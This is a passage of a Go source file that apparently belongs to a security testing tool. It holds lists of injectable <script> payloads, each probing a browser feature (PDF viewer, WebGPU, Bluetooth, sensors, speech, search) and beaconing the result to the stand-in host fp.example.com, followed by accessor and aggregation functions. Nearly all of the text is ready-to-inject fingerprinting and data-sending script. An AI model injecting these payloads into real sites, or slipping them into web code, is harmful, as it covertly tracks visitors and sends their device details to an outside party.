	{Raw: `<script>new Image().src='//fp.example.com/os?se='+(window.external&&window.external.AddSearchProvider?'1':'0')+'&oss='+(navigator.plugins['OpenSearch']?'1':'0');</script>`, Description: "搜索-OpenSearch检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/os2?link='+(!!document.querySelector('link[type="application/opensearchdescription+xml"]')?'1':'0');</script>`, Description: "搜索-OpenSearch Link", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os3?external='+(window.external?'1':'0')+'&add='+(window.external&&window.external.AddSearchProvider?'1':'0');</script>`, Description: "搜索-外部方法", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/os4?isProvider='+(window.external&&window.external.IsSearchProviderInstalled?'1':'0');</script>`, Description: "搜索-已安装检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/os5?manifest='+(document.querySelector('link[rel=manifest]')?'1':'0');</script>`, Description: "搜索-Manifest Link", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os6?customSchema='+(!!document.querySelector('meta[name=search-schema]')?'1':'0');</script>`, Description: "搜索-自定义模式", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os7?autocomp='+(document.querySelector('form[role=search]')?'1':'0');</script>`, Description: "搜索-搜索表单", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os8?searchInput='+(document.querySelector('input[type=search]')?'1':'0');</script>`, Description: "搜索-输入框", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os9?moz='+(window.external&&window.external.addEngine?'1':'0');</script>`, Description: "搜索-Firefox引擎", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/os10?web='+(navigator.webSearch?'1':'0');</script>`, Description: "搜索-Web Search API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/os11?meta='+(!!document.querySelector('meta[name=search-terms]')?'1':'0');</script>`, Description: "搜索-搜索词元数据", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os12?schema='+(!!document.querySelector('[itemtype*="SearchAction"]')?'1':'0');</script>`, Description: "搜索-Schema.org SearchAction", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os13?jsonld='+(!!document.querySelector('script[type="application/ld+json"]')?'1':'0');</script>`, Description: "搜索-JSON-LD", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os14?opentype='+(!!document.querySelector('link[rel=search]')?'1':'0');</script>`, Description: "搜索-传统search link", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/os15?sitesearch='+(window.siteSearch?'1':'0');</script>`, Description: "搜索-站点搜索API", FPType: FingerprintPlugin},
}

var fingerprintPDFViewer = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/pdf?v='+(navigator.pdfViewerEnabled?'1':'0')+'&pdf='+(navigator.mimeTypes['application/pdf']?'1':'0');</script>`, Description: "PDF-查看器", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf2?mime='+(navigator.mimeTypes['application/pdf']?navigator.mimeTypes['application/pdf'].enabledPlugin?'1':'0':'na');</script>`, Description: "PDF-MIME插件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf3?plugins='+(navigator.plugins.length)+'&pdf='+(navigator.plugins.namedItem('Chrome PDF Viewer')?'chrome':navigator.plugins.namedItem('Adobe Acrobat')?'adobe':'none');</script>`, Description: "PDF-插件类型检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf4?chromePDF='+(navigator.plugins.namedItem('Chrome PDF Viewer')?'1':'0')+'&safariPDF='+(navigator.plugins.namedItem('WebKit built-in PDF')?'1':'0');</script>`, Description: "PDF-Chrome/Safari插件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf5?adobe='+(navigator.plugins.namedItem('Adobe Acrobat')?'1':'0')+'&pdfx='+(navigator.plugins.namedItem('PDF-XChange Viewer')?'1':'0');</script>`, Description: "PDF-Adobe/PDF-XChange", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf6?edge='+(navigator.plugins.namedItem('Microsoft Edge PDF Viewer')?'1':'0')+'&firefox='+(navigator.plugins.namedItem('Mozilla PDF Viewer')?'1':'0');</script>`, Description: "PDF-Edge/Firefox插件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf7?count='+(navigator.mimeTypes.length)+'&named='+(navigator.mimeTypes.namedItem('application/pdf')?'1':'0');</script>`, Description: "PDF-MIME计数", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf8?type='+(navigator.mimeTypes['application/pdf']?navigator.mimeTypes['application/pdf'].type:'na');</script>`, Description: "PDF-MIME类型", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf9?desc='+(navigator.mimeTypes['application/pdf']?encodeURIComponent(navigator.mimeTypes['application/pdf'].description||''):'na');</script>`, Description: "PDF-MIME描述", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf10?suffix='+(navigator.mimeTypes['application/pdf']?navigator.mimeTypes['application/pdf'].suffixes:'na');</script>`, Description: "PDF-MIME后缀", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf11?array='+(typeof PDFViewerApplication!=='undefined'?'1':'0');</script>`, Description: "PDF-PDF.js全局", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf12?viewer='+(document.querySelector('embed[type="application/pdf"]')?'1':'0')+'&iframe='+(document.querySelector('iframe[src$=".pdf"]')?'1':'0');</script>`, Description: "PDF-页面嵌入检测", FPType: FingerprintScreen},
	{Raw: `<script>new Image().src='//fp.example.com/pdf13?enabled='+(navigator.pdfViewerEnabled?'1':'0');</script>`, Description: "PDF-启用状态", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf14?canPlay='+(document.createElement('video').canPlayType('application/pdf')||'na');</script>`, Description: "PDF-视频canPlay检测", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/pdf15?embed='+(typeof navigator.mimeTypes['application/pdf']!=='undefined'?'1':'0');</script>`, Description: "PDF-综合检测", FPType: FingerprintPlugin},
}

var fingerprintWebGPU = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/gpu?api='+(navigator.gpu?'1':'0');</script>`, Description: "GPU-API检测", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.gpu){navigator.gpu.requestAdapter().then(function(a){new Image().src='//fp.example.com/gpu2?adapter='+(a?'1':'0')+'&name='+encodeURIComponent(a? (a.name||'na'): 'na');});}</script>`, Description: "GPU-适配器名称", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.gpu){navigator.gpu.requestAdapter().then(function(a){a.requestDevice().then(function(d){new Image().src='//fp.example.com/gpu3?device='+(d?'1':'0');});});}</script>`, Description: "GPU-设备请求", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/gpu4?adapter='+(navigator.gpu&&navigator.gpu.requestAdapter?'1':'0')+'&getPref='+(navigator.gpu&&navigator.gpu.getPreferredCanvasFormat?'1':'0');</script>`, Description: "GPU-完整API检测", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.gpu){navigator.gpu.requestAdapter().then(function(a){new Image().src='//fp.example.com/gpu5?limits='+(a.limits?'1':'0')+'&features='+(a.features?'1':'0');});}</script>`, Description: "GPU-限制和功能", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.gpu){navigator.gpu.requestAdapter().then(function(a){var feat=[];if(a.features){a.features.forEach(function(f){feat.push(f);})}new Image().src='//fp.example.com/gpu6?cnt='+feat.length;})}</script>`, Description: "GPU-功能计数", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/gpu7?get='+(navigator.gpu&&navigator.gpu.getPreferredCanvasFormat?'1':'0');</script>`, Description: "GPU-画布格式", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.gpu){navigator.gpu.requestAdapter().then(function(a){new Image().src='//fp.example.com/gpu8?maxBind='+(a.limits.maxBindGroups||'na')+'&maxBuf='+(a.limits.maxBufferSize||'na');});}</script>`, Description: "GPU-资源限制", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.gpu){navigator.gpu.requestAdapter({powerPreference:'high-performance'}).then(function(a){new Image().src='//fp.example.com/gpu9?pref='+(a?'1':'0');});}</script>`, Description: "GPU-高性能偏好", FPType: FingerprintHardware},
	{Raw: `<script>if(navigator.gpu){navigator.gpu.requestAdapter({powerPreference:'low-power'}).then(function(a){new Image().src='//fp.example.com/gpu10?pref='+(a?'1':'0');});}</script>`, Description: "GPU-低功耗偏好", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/gpu11?wgsl='+(navigator.gpu?'1':'0');</script>`, Description: "GPU-WGSL支持", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/gpu12?shader='+(GPUShaderModule?'1':'0')+'&pipeline='+(GPURenderPipeline?'1':'0');</script>`, Description: "GPU-着色器/管线", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/gpu13?buf='+(GPUBuffer?'1':'0')+'&tex='+(GPUTexture?'1':'0');</script>`, Description: "GPU-缓冲/纹理", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/gpu14?q='+(GPUQueue?'1':'0')+'&cmd='+(GPUCommandEncoder?'1':'0');</script>`, Description: "GPU-队列/命令编码", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/gpu15?comp='+(GPUComputePipeline?'1':'0')+'&bind='+(GPUBindGroup?'1':'0');</script>`, Description: "GPU-计算管线/绑定组", FPType: FingerprintHardware},
}

var fingerprintBluetooth = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/bt?api='+(navigator.bluetooth?'1':'0');</script>`, Description: "蓝牙-API检测", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/bt2?avail='+(navigator.bluetooth&&navigator.bluetooth.getAvailability?'1':'0')+'&req='+(navigator.bluetooth&&navigator.bluetooth.requestDevice?'1':'0');</script>`, Description: "蓝牙-可用性/请求", FPType: FingerprintHardware},
	{Raw: `<script>try{navigator.bluetooth.getAvailability().then(function(a){new Image().src='//fp.example.com/bt3?avail='+(a?'1':'0');});}catch(e){}</script>`, Description: "蓝牙-可用性检查", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/bt4?scan='+(navigator.bluetooth&&navigator.bluetooth.requestLEScan?'1':'0');</script>`, Description: "蓝牙-LE扫描", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/bt5?gatt='+(BluetoothRemoteGATTServer?'1':'0')+'&char='+(BluetoothRemoteGATTCharacteristic?'1':'0');</script>`, Description: "蓝牙-GATT API", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/bt6?event='+(typeof BluetoothDevice!=='undefined'?'1':'0')+'&uuid='+(BluetoothUUID?'1':'0');</script>`, Description: "蓝牙-设备/事件", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/bt7?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');if(navigator.permissions){navigator.permissions.query({name:'bluetooth'}).then(function(s){new Image().src='//fp.example.com/bt8?state='+s.state;})}</script>`, Description: "蓝牙-权限查询", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/bt9?service='+(BluetoothRemoteGATTService?'1':'0')+'&desc='+(BluetoothRemoteGATTDescriptor?'1':'0');</script>`, Description: "蓝牙-GATT服务/描述符", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/bt10?filter='+(navigator.bluetooth&&navigator.bluetooth.requestDevice?'1':'0');</script>`, Description: "蓝牙-设备过滤", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/bt11?ad='+(BluetoothAdvertisingEvent?'1':'0');</script>`, Description: "蓝牙-广告事件", FPType: FingerprintHardware},
}

var fingerprintSensors = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/sensor?abs='+(typeof AbsoluteOrientationSensor!=='undefined'?'1':'0')+'&rel='+(typeof RelativeOrientationSensor!=='undefined'?'1':'0');</script>`, Description: "传感器-方向传感器", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor2?acc='+(typeof Accelerometer!=='undefined'?'1':'0')+'&lin='+(typeof LinearAccelerationSensor!=='undefined'?'1':'0');</script>`, Description: "传感器-加速度传感器", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor3?gyro='+(typeof Gyroscope!=='undefined'?'1':'0')+'&mag='+(typeof Magnetometer!=='undefined'?'1':'0');</script>`, Description: "传感器-陀螺仪/磁力计", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor4?amb='+(typeof AmbientLightSensor!=='undefined'?'1':'0')+'&prox='+(typeof ProximitySensor!=='undefined'?'1':'0');</script>`, Description: "传感器-光线/接近", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor5?freq='+(Sensor&&Sensor.prototype.frequency?'1':'0')+'&act='+(Sensor&&Sensor.prototype.activated?'1':'0');</script>`, Description: "传感器-Sensor基类属性", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor6?onread='+(Sensor&&Sensor.prototype.onreading?'1':'0')+'&onerr='+(Sensor&&Sensor.prototype.onerror?'1':'0');</script>`, Description: "传感器-事件处理", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor7?start='+(Sensor&&Sensor.prototype.start?'1':'0')+'&stop='+(Sensor&&Sensor.prototype.stop?'1':'0');</script>`, Description: "传感器-启动/停止", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor8?perm='+(navigator.permissions?navigator.permissions.query?'1':'0':'0');if(navigator.permissions){navigator.permissions.query({name:'accelerometer'}).then(function(s){new Image().src='//fp.example.com/sensor9?state='+s.state;})}</script>`, Description: "传感器-加速度权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'gyroscope'}).then(function(s){new Image().src='//fp.example.com/sensor10?state='+s.state;})}</script>`, Description: "传感器-陀螺仪权限", FPType: FingerprintPlugin},
	{Raw: `<script>if(navigator.permissions){navigator.permissions.query({name:'ambient-light-sensor'}).then(function(s){new Image().src='//fp.example.com/sensor11?state='+s.state;})}</script>`, Description: "传感器-光线传感器权限", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/sensor12?incl='+(typeof DeviceOrientationEvent!=='undefined'?'1':'0')+'&abs='+(typeof DeviceOrientationEvent!=='undefined'&&DeviceOrientationEvent.requestPermission?'1':'0');</script>`, Description: "传感器-设备方向事件", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor13?comp='+(typeof CompassNeedscalibrationEvent!=='undefined'?'1':'0');</script>`, Description: "传感器-罗盘校准", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor14?angle='+(typeof DeviceOrientationEvent!=='undefined'&&typeof DeviceOrientationEvent.absolute!=='undefined'?'1':'0');</script>`, Description: "传感器-绝对方向", FPType: FingerprintHardware},
	{Raw: `<script>new Image().src='//fp.example.com/sensor15?gravity='+(typeof GravitySensor!=='undefined'?'1':'0');</script>`, Description: "传感器-重力传感器", FPType: FingerprintHardware},
}

var fingerprintSpeech = []Payload{
	{Raw: `<script>new Image().src='//fp.example.com/speech?stt='+(typeof SpeechRecognition!=='undefined'||typeof webkitSpeechRecognition!=='undefined'?'1':'0')+'&tts='+(typeof SpeechSynthesisUtterance!=='undefined'?'1':'0');</script>`, Description: "语音-STT/TTS API", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech2?voices='+('speechSynthesis' in window?speechSynthesis.getVoices().length:'0');</script>`, Description: "语音-语音数量", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech3?speak='+(typeof SpeechSynthesisUtterance!=='undefined'?'1':'0')+'&grammar='+(typeof SpeechGrammarList!=='undefined'?'1':'0');</script>`, Description: "语音-语法列表", FPType: FingerprintPlugin},
	{Raw: `<script>if(window.speechSynthesis){var v=speechSynthesis.getVoices();var langs=[];v.forEach(function(voice){langs.push(voice.lang);});new Image().src='//fp.example.com/speech4?langs='+encodeURIComponent(langs.join(','));}</script>`, Description: "语音-语言列表", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech5?continuous='+(typeof SpeechRecognition!=='undefined'?SpeechRecognition.prototype.continuous?'1':'0':'0');</script>`, Description: "语音-连续识别", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech6?interim='+(typeof SpeechRecognition!=='undefined'?SpeechRecognition.prototype.interimResults?'1':'0':'0');</script>`, Description: "语音-中间结果", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech7?maxAlt='+(typeof SpeechRecognition!=='undefined'?SpeechRecognition.prototype.maxAlternatives?'1':'0':'0');</script>`, Description: "语音-最大候选项", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech8?grammar='+(typeof SpeechGrammar!=='undefined'?'1':'0');</script>`, Description: "语音-语法对象", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech9?event='+(typeof SpeechRecognitionEvent!=='undefined'?'1':'0');</script>`, Description: "语音-识别事件", FPType: FingerprintPlugin},
	{Raw: `<script>new Image().src='//fp.example.com/speech10?confidence='+(typeof SpeechRecognitionAlternative!=='undefined'?'1':'0');</script>`, Description: "语音-置信度", FPType: FingerprintPlugin},
}

func FingerprintWebGPUPayloads() []Payload          { return fingerprintWebGPU }
func FingerprintBluetoothPayloads() []Payload        { return fingerprintBluetooth }
func FingerprintSensorsPayloads() []Payload          { return fingerprintSensors }
func FingerprintSpeechPayloads() []Payload           { return fingerprintSpeech }

func FingerprintMathPayloads() []Payload            { return fingerprintMath }
func FingerprintIntlPayloads() []Payload            { return fingerprintIntl }
func FingerprintWebWorkerPayloads() []Payload       { return fingerprintWebWorker }
func FingerprintWebAssemblyPayloads() []Payload      { return fingerprintWebAssembly }
func FingerprintCryptoPayloads() []Payload           { return fingerprintCrypto }
func FingerprintNotificationPayloads() []Payload     { return fingerprintNotification }
func FingerprintGeolocationPayloads() []Payload      { return fingerprintGeolocation }
func FingerprintClipboardPayloads() []Payload        { return fingerprintClipboard }
func FingerprintPermissionsPayloads() []Payload      { return fingerprintPermissions }
func FingerprintReferrerPayloads() []Payload         { return fingerprintReferrer }
func FingerprintCookiePayloads() []Payload           { return fingerprintCookie }
func FingerprintJSFeaturesPayloads() []Payload       { return fingerprintJSFeatures }
func FingerprintCSSFeaturesPayloads() []Payload      { return fingerprintCSSFeatures }
func FingerprintProgressiveWebPayloads() []Payload   { return fingerprintProgressiveWeb }
func FingerprintXRPayloads() []Payload               { return fingerprintXR }
func FingerprintKeyboardPayloads() []Payload         { return fingerprintKeyboard }
func FingerprintWakeLockPayloads() []Payload         { return fingerprintScreenWake }
func FingerprintFullscreenPayloads() []Payload       { return fingerprintFullscreen }
func FingerprintCredManPayloads() []Payload          { return fingerprintCredMan }
func FingerprintPaymentPayloads() []Payload          { return fingerprintPayment }
func FingerprintSearchPayloads() []Payload           { return fingerprintOpenSearch }
func FingerprintPDFPayloads() []Payload              { return fingerprintPDFViewer }

func FingerprintCanvasPayloads() []Payload        { return fingerprintCanvas }
func FingerprintWebGLPayloads() []Payload          { return fingerprintWebGL }
func FingerprintAudioPayloads() []Payload          { return fingerprintAudio }
func FingerprintFontPayloads() []Payload           { return fingerprintFont }
func FingerprintWebRTCPayloads() []Payload         { return fingerprintWebRTC }
func FingerprintBatteryPayloads() []Payload        { return fingerprintBattery }
func FingerprintPluginPayloads() []Payload         { return fingerprintPlugin }
func FingerprintScreenPayloads() []Payload         { return fingerprintScreen }
func FingerprintTimezonePayloads() []Payload       { return fingerprintTimezone }
func FingerprintLanguagePayloads() []Payload       { return fingerprintLanguage }
func FingerprintUserAgentPayloads() []Payload      { return fingerprintUserAgent }
func FingerprintHardwarePayloads() []Payload       { return fingerprintHardware }
func FingerprintPerformancePayloads() []Payload    { return fingerprintPerformance }
func FingerprintStoragePayloads() []Payload        { return fingerprintStorage }
func FingerprintMediaPayloads() []Payload          { return fingerprintMedia }
func FingerprintComprehensivePayloads() []Payload  { return fingerprintComprehensive }

func FingerprintByType(fp FingerprintType) []Payload {
	switch fp {
	case FingerprintCanvas:
		return fingerprintCanvas
	case FingerprintWebGL:
		return fingerprintWebGL
	case FingerprintAudio:
		return fingerprintAudio
	case FingerprintFont:
		return fingerprintFont
	case FingerprintWebRTC:
		return fingerprintWebRTC
	case FingerprintBattery:
		return fingerprintBattery
	case FingerprintPlugin:
		return fingerprintPlugin
	case FingerprintScreen:
		return fingerprintScreen
	case FingerprintTimezone:
		return fingerprintTimezone
	case FingerprintLanguage:
		return fingerprintLanguage
	case FingerprintUserAgent:
		return fingerprintUserAgent
	case FingerprintHardware:
		return fingerprintHardware
	default:
		return fingerprintCanvas
	}
}

func FingerprintAllPayloads() []Payload {
	var all []Payload
	all = append(all, fingerprintCanvas...)
	all = append(all, fingerprintWebGL...)
	all = append(all, fingerprintAudio...)
	all = append(all, fingerprintFont...)
	all = append(all, fingerprintWebRTC...)
	all = append(all, fingerprintBattery...)
	all = append(all, fingerprintPlugin...)
	all = append(all, fingerprintScreen...)
	all = append(all, fingerprintTimezone...)
	all = append(all, fingerprintLanguage...)
	all = append(all, fingerprintUserAgent...)
	all = append(all, fingerprintHardware...)
	all = append(all, fingerprintPerformance...)
	all = append(all, fingerprintStorage...)
	all = append(all, fingerprintMedia...)
	all = append(all, fingerprintComprehensive...)
	all = append(all, fingerprintTouch...)
	all = append(all, fingerprintOrientation...)
	all = append(all, fingerprintCSSMedia...)
	all = append(all, fingerprintNavigatorProps...)
	all = append(all, fingerprintCSSFingerprinting...)
	all = append(all, fingerprintVideoCard...)
	all = append(all, fingerprintDNT...)
	all = append(all, fingerprintMath...)
	all = append(all, fingerprintIntl...)
	all = append(all, fingerprintWebWorker...)
	all = append(all, fingerprintWebAssembly...)
	all = append(all, fingerprintCrypto...)
	all = append(all, fingerprintNotification...)
	all = append(all, fingerprintGeolocation...)
	all = append(all, fingerprintClipboard...)
	all = append(all, fingerprintPermissions...)
	all = append(all, fingerprintReferrer...)
	all = append(all, fingerprintCookie...)
	all = append(all, fingerprintJSFeatures...)
	all = append(all, fingerprintCSSFeatures...)
	all = append(all, fingerprintProgressiveWeb...)
	all = append(all, fingerprintXR...)
	all = append(all, fingerprintKeyboard...)
	all = append(all, fingerprintScreenWake...)
	all = append(all, fingerprintFullscreen...)
	all = append(all, fingerprintCredMan...)
	all = append(all, fingerprintPayment...)
	all = append(all, fingerprintOpenSearch...)
	all = append(all, fingerprintPDFViewer...)
	all = append(all, fingerprintWebGPU...)
	all = append(all, fingerprintBluetooth...)
	all = append(all, fingerprintSensors...)
	all = append(all, fingerprintSpeech...)
	return all
}